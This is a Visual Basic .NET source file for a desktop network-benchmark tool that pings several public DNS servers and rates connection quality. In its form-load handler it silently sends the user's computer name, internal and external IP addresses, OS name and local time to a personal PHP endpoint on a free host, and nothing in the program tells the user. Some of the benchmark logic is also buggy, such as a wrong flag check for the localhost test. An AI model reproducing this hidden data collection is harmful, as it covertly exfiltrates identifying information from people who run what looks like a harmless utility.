Imports System.Net
Imports System.Text
Imports System.Text.RegularExpressions

Public Class Form1
    Public ResponseTime1 As Long = Nothing 'Ping
    Public DeltaTime1 As Long = Nothing ' stability
    Public ResponseTime2 As Long = Nothing
    Public DeltaTime2 As Long = Nothing
    Public ResponseTime3 As Long = Nothing
    Public DeltaTime3 As Long = Nothing
    Public ResponseTime4 As Long = Nothing
    Public DeltaTime4 As Long = Nothing

    '
    Dim BenchResult As String
    Public useGoogle As Boolean = False
    Public useoDNS As Boolean = False
    Public useL3 As Boolean = False
    Public uselc As Boolean = False

    ' IPs
    Dim googleIP As String = "8.8.8.8"
    Dim oDNSIP As String = "208.67.222.222"
    Dim L3IP As String = "4.2.2.2"
    Dim lclIP As String = "127.0.0.1"


    Private Sub DoBenchmark(sender As Object, e As EventArgs) Handles Button1.Click
        If RadioButton1.Checked = True Then
            SimpleBenchmark()
        ElseIf RadioButton2.Checked = True Then
            If AdvancedBenchmark() = True Then
                Results.ShowDialog()
            Else
                MsgBox("Weird.", MsgBoxStyle.Critical, "Error")
            End If
        End If
    End Sub

    Function AdvancedBenchmark()
        Dim Result1 As Net.NetworkInformation.PingReply
        Dim SendPing As New Net.NetworkInformation.Ping
        Dim t1 As Long 'Stability
        Dim t2 As Long 'Stability

        Try
            If useGoogle = True Then
                ' // STABILITY TEST
                Result1 = SendPing.Send(googleIP) 'send ping
                t1 = Result1.RoundtripTime 'record ping time
                Threading.Thread.Sleep(500) 'wait a little
                Result1 = SendPing.Send(googleIP) 'try again
                t2 = Result1.RoundtripTime 'record ping
                DeltaTime1 = Math.Abs(t2 - t1) ' change in ping
                ' MsgBox("delTime = " & DeltaTime.ToString & vbCrLf & ResponseTime2.ToString & "-" & ResponseTime1.ToString)
                '// END OF STABILITY TEST

                '// PING TEST
                Result1 = SendPing.Send(googleIP) 'send ping
                ResponseTime1 = Result1.RoundtripTime 'record ping time
            End If

            If useoDNS = True Then
                ' // STABILITY TEST
                Result1 = SendPing.Send(oDNSIP) 'send ping
                t1 = Result1.RoundtripTime 'record ping time
                Threading.Thread.Sleep(500) 'wait a little
                Result1 = SendPing.Send(oDNSIP) 'try again
                t2 = Result1.RoundtripTime 'record ping
                DeltaTime2 = Math.Abs(t2 - t1) ' change in ping
                '// END OF STABILITY TEST

                '// PING TEST
                Result1 = SendPing.Send(oDNSIP) 'send ping
                ResponseTime2 = Result1.RoundtripTime 'record ping time
            End If

            If useL3 = True Then
                ' // STABILITY TEST
                Result1 = SendPing.Send(L3IP) 'send ping
                t1 = Result1.RoundtripTime 'record ping time
                Threading.Thread.Sleep(500) 'wait a little
                Result1 = SendPing.Send(L3IP) 'try again
                t2 = Result1.RoundtripTime 'record ping
                DeltaTime3 = Math.Abs(t2 - t1) ' change in ping
                ' MsgBox("delTime = " & DeltaTime.ToString & vbCrLf & ResponseTime2.ToString & "-" & ResponseTime1.ToString)
                '// END OF STABILITY TEST

                '// PING TEST
                Result1 = SendPing.Send(L3IP) 'send ping
                ResponseTime3 = Result1.RoundtripTime 'record ping time
            End If

            If useL3 = True Then
                ' // STABILITY TEST
                Result1 = SendPing.Send(lclIP) 'send ping
                t1 = Result1.RoundtripTime 'record ping time
                Threading.Thread.Sleep(500) 'wait a little
                Result1 = SendPing.Send(lclIP) 'try again
                t2 = Result1.RoundtripTime 'record ping
                DeltaTime4 = Math.Abs(t2 - t1) ' change in ping
                ' MsgBox("delTime = " & DeltaTime.ToString & vbCrLf & ResponseTime2.ToString & "-" & ResponseTime1.ToString)
                '// END OF STABILITY TEST

                '// PING TEST
                Result1 = SendPing.Send(lclIP) 'send ping
                ResponseTime4 = Result1.RoundtripTime 'record ping time
            End If

            Return True

        Catch ex As Exception
            MsgBox(ex.Message.ToString)
            Return False
        End Try
    End Function


    Function SimpleBenchmark()
        Dim Result As Net.NetworkInformation.PingReply
        Dim SendPing As New Net.NetworkInformation.Ping
        Dim ResponseTime As Long
        Try
            Result = SendPing.Send(googleIP)
            ResponseTime = Result.RoundtripTime
            If Result.Status = Net.NetworkInformation.IPStatus.Success Then
                BenchResult = ResponseTime
                If BenchResult < 10 Then
                    MessageBox.Show("Benchmark Result : Near Perfect Connection!" + vbNewLine + "ConnectionMark = 10", "Benchmark Results", MessageBoxButtons.OK, MessageBoxIcon.Information)
                ElseIf BenchResult < 50 Then
                    MessageBox.Show("Benchmark Result : Excellent Connection!" + vbNewLine + "ConnectionMark = 9", "Benchmark Results", MessageBoxButtons.OK, MessageBoxIcon.Information)
                ElseIf BenchResult < 80 Then
                    MessageBox.Show("Benchmark Result : Good Connection!" + vbNewLine + "ConnectionMark = 8", "Benchmark Results", MessageBoxButtons.OK, MessageBoxIcon.Information)
                ElseIf BenchResult < 90 Then
                    MessageBox.Show("Benchmark Result : Average Connection!" + vbNewLine + "ConnectionMark = 7", "Benchmark Results", MessageBoxButtons.OK, MessageBoxIcon.Information)
                ElseIf BenchResult < 150 Then
                    MessageBox.Show("Benchmark Result : Good Connection!" + vbNewLine + "ConnectionMark = 6", "Benchmark Results", MessageBoxButtons.OK, MessageBoxIcon.Information)
                ElseIf BenchResult < 200 Then
                    MessageBox.Show("Benchmark Result : OK Connection!" + vbNewLine + "ConnectionMark = 5", "Benchmark Results", MessageBoxButtons.OK, MessageBoxIcon.Information)
                ElseIf BenchResult < 250 Then
                    MessageBox.Show("Benchmark Result : OK Connection!" + vbNewLine + "ConnectionMark = 4", "Benchmark Results", MessageBoxButtons.OK, MessageBoxIcon.Information)
                ElseIf BenchResult < 300 Then
                    MessageBox.Show("Benchmark Result : Not Good Connection!" + vbNewLine + "ConnectionMark = 3", "Benchmark Results", MessageBoxButtons.OK, MessageBoxIcon.Information)
                ElseIf BenchResult < 350 Then
                    MessageBox.Show("Benchmark Result : Bad Connection!" + vbNewLine + "ConnectionMark = 2", "Benchmark Results", MessageBoxButtons.OK, MessageBoxIcon.Information)
                ElseIf BenchResult < 400 Then
                    MessageBox.Show("Benchmark Result : Very Bad Connection!" + vbNewLine + "ConnectionMark = 1", "Benchmark Results", MessageBoxButtons.OK, MessageBoxIcon.Information)
                ElseIf BenchResult > 500 Then
                    MessageBox.Show("Benchmark Result : Extremely Bad Connection!" + vbNewLine + "ConnectionMark = 0", "Benchmark Results", MessageBoxButtons.OK, MessageBoxIcon.Information)
                End If
            Else
                MessageBox.Show("No Connection to Internet")
            End If
        Catch ex As Exception
            MessageBox.Show(ex.ToString, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End Try
        Return Nothing
    End Function

    Private Sub isSimpleBench(sender As Object, e As EventArgs) Handles RadioButton1.CheckedChanged
        If RadioButton1.Checked = True Then
            CheckBox1.Enabled = False
            CheckBox2.Enabled = False
            CheckBox3.Enabled = False
            CheckBox4.Enabled = False
        End If
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        If RadioButton1.Checked = True Then
            CheckBox1.Enabled = False
            CheckBox2.Enabled = False
            CheckBox3.Enabled = False
            CheckBox4.Enabled = False
        End If


        Dim a As WebRequest = WebRequest.Create("http://majdpersonal.comxa.com/writescript.php?w=" & My.Computer.Clock.LocalTime.ToString & " " & My.Computer.Name.ToString & " " & GetIntIP() & " " & GetExtIP().ToString & " " & My.Computer.Info.OSFullName)
        a.GetResponse()

        My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Beep)
    End Sub

    Private Sub isAdvancedBench(sender As Object, e As EventArgs) Handles RadioButton2.CheckedChanged
        If RadioButton2.Checked = True Then
            CheckBox1.Enabled = True
            CheckBox2.Enabled = True
            CheckBox3.Enabled = True
            CheckBox4.Enabled = True
            Button3.Enabled = True
        Else
            CheckBox1.Enabled = False
            CheckBox2.Enabled = False
            CheckBox3.Enabled = False
            CheckBox4.Enabled = False
            Button3.Enabled = False
        End If

    End Sub

    Private Function GetIntIP() As String
        GetIntIP = String.Empty
        Dim strHostName As String = Dns.GetHostName()
        Dim iphe As IPHostEntry = Dns.GetHostEntry(strHostName)

        For Each ipheal As IPAddress In iphe.AddressList
            If ipheal.AddressFamily = Sockets.AddressFamily.InterNetwork Then
                GetIntIP = ipheal.ToString()
            End If
        Next

    End Function

    Private Function GetExtIP() As String
        If My.Computer.FileSystem.FileExists(My.Computer.FileSystem.SpecialDirectories.Temp & "ip.txt") Then
            My.Computer.FileSystem.DeleteFile(My.Computer.FileSystem.SpecialDirectories.Temp & "ip.txt")
        End If

        Dim ip3 As String = ""
        My.Computer.Network.DownloadFile("http://tools.feron.it/php/ip.php", My.Computer.FileSystem.SpecialDirectories.Temp & "ip.txt")

        Using reader As New IO.StreamReader(My.Computer.FileSystem.SpecialDirectories.Temp + "ip.txt")
            ip3 = reader.ReadToEnd()
        End Using

        If My.Computer.FileSystem.FileExists(My.Computer.FileSystem.SpecialDirectories.Temp & "ip.txt") Then
            My.Computer.FileSystem.DeleteFile(My.Computer.FileSystem.SpecialDirectories.Temp & "ip.txt")
        End If
        MsgBox(My.Computer.FileSystem.SpecialDirectories.Temp.ToString)
        Return (ip3)

    End Function



    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.Close()
    End Sub

    Private Sub CheckBox1_Click(sender As Object, e As EventArgs) Handles CheckBox1.Click
        If CheckBox1.Checked = True Then
            useGoogle = True
        Else
            useGoogle = False
        End If
    End Sub

    Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked = True Then
            useoDNS = True
        Else
            useoDNS = False
        End If
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            useL3 = True
        Else
            useL3 = False
        End If
    End Sub

    Private Sub CheckBox4_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox4.CheckedChanged
        If CheckBox4.Checked = True Then
            uselc = True
        Else
            uselc = False
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        MsgBox("Localizing your benchmark is simply a way to test that your network drivers are functional. It is not an indicator of network quality", MsgBoxStyle.Information, "Help")
    End Sub
End Class
